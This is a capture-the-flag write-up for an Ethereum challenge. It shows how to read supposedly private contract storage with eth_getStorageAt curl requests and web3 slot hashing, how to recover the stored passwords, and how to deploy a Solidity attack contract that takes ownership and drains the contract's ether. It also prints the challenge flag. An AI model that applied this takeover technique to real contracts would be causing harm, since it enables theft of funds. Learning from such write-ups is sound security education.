# [MEDIUM] DuperSuperSafeSafe - Solution

**Author**: AtlanticBase

**Category**: Ethereum

This challenge requires you to make use of how blockchain stores information. Setting your variable private doesn't mean that it is private as you can still view it through other ways.

It requires you to know the `EVM storage layout`.

First, you will need to change the owner. In order to pass the condition, you will have to create a contract to call the function.

In order to get the timestamp,

```bash
curl --location --request POST 'awesome.chall.seetf.sg:40002/' \
--header 'Content-Type: application/json' \
--data-raw '{
	"jsonrpc":"2.0",
	"method": "eth_getStorageAt",
	"params": [
		"0x0E161f71f41baF3883a2CE0fe04cbaddb5259791",
		"0x2",
		"latest"
	],
	"id": 1
}'
```

You will get

`{"jsonrpc":"2.0","id":1,"result":"0x0000000000000000000000000000000000000000000000000000000062905ffd"}`

If you convert the result to decimal, you will get the epoch timestamp.

E.G. `1653628925`

Now, in order to get the passwords, you will need to understand how the mapping works.

Based on the code, the mapping variable is in the second slot of the storage.

However, solidity just uses that as a pointer to the actual data.

You will need to hash the slot (`0x1`) and the key of the mapping variable (`0x0`) to get the value.

You can use `web3` to calculate the hash

`web3.utils.soliditySha3(0, 1)`

The value is `0xa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb49`

```bash
curl --location --request POST 'awesome.chall.seetf.sg:40002/' \
--header 'Content-Type: application/json' \
--data-raw '{
	"jsonrpc":"2.0",
	"method": "eth_getStorageAt",
	"params": [
		"0x0E161f71f41baF3883a2CE0fe04cbaddb5259791",
		"0xa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb49",
		"latest"
	],
	"id": 1
}'
```

Then you will get `0x57617979616e6700000000000000000000000000000000000000000000000000`

In order to convert it to text, you can use
`web3.utils.hexToUtf8("0x57617979616e6700000000000000000000000000000000000000000000000000")`

Second slot,

`web3.utils.soliditySha3(1, 1)`

The value is `0xcc69885fda6bcc1a4ace058b4a62bf5e179ea78fd58a1ccd71c22cc9b688792f`

```bash
curl --location --request POST 'awesome.chall.seetf.sg:40002/' \
--header 'Content-Type: application/json' \
--data-raw '{
	"jsonrpc":"2.0",
	"method": "eth_getStorageAt",
	"params": [
		"0x0E161f71f41baF3883a2CE0fe04cbaddb5259791",
		"0xcc69885fda6bcc1a4ace058b4a62bf5e179ea78fd58a1ccd71c22cc9b688792f",
		"latest"
	],
	"id": 1
}'
```

The result is `{"jsonrpc":"2.0","id":1,"result":"0x4375746500000000000000000000000000000000000000000000000000000000"}`

Converting it to text, `Cute`.

Create an Attack Contract to call the `changeOwner` function

```javascript
contract DSSSAttack {

    DuperSuperSafeSafe dsss;

    constructor() {
        dsss = DuperSuperSafeSafe(payable(0x0E161f71f41baF3883a2CE0fe04cbaddb5259791));
        dsss.changeOwner([address]);
    }
}
```

After the owner is changed, you can call the `withdrawFunds` method directly as the EOA is the owner.

To solve, drain all the 0.3 ether in the contract.

Flag: `SEE{B10cKcH41n_I5_sUp3r_53cuRe!}`
